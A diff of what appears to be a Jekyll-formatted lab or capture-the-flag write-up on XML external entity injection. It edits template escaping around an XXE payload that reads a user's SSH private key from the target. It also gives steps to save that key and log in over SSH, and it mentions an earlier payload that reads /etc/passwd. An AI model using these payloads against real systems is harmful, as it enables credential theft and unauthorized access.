@@ -216,8 +216,8 @@ Use the following payloads to get the contents of `/etc/passwd`.
 <root>&amp;read;</root>{% endcapture %} {% include code.html code=code lang="xml"%}
 
 There is one non-system user. Use the following payload to read the user's rsa private key.
-{% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
-<root>&read;</root>{% endcapture %} {% include code.html code=code lang="xml"%}
+{% raw %}{% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
+<root>&amp;read;</root>{% endcapture %}{% endraw %} {% include code.html code=code lang="xml"%}
 
 Copy the contents of payload output to new file. Change the permission of the file to be more stricter, like `chmod 400 <user>_id_rsa` and use `ssh` to login to the machine using downloaded user's ssh private key.
 {% capture code %}{% raw %}ssh -i <user>_id_rsa <user>@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
